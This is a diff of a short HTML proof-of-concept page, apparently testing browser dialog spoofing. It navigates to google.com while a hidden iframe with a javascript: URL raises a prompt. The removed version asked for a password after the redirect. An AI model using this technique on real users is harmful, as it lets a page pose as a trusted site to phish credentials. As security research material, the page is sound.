@@ -1,18 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Button Trigger</title>
-</head>
-<body>  
-    <button id="triggerBtn">Click Me</button>
 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
     <script>
-        document.getElementById('triggerBtn').onclick = () => {
-          document.location ='http://google.com';
-          prompt('give me password')
-        };
+    function triggerIframe() {
+        var iframe = document.createElement('iframe');
+        document.location="http://google.com"
+        //location.replace("http://www.google.com");
+        iframe.src = 'javascript:prompt("No"+"origin")';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
     </script>
+</head>
+<body>
+    <button onclick="triggerIframe()">Trigger</button>
 </body>
 </html>
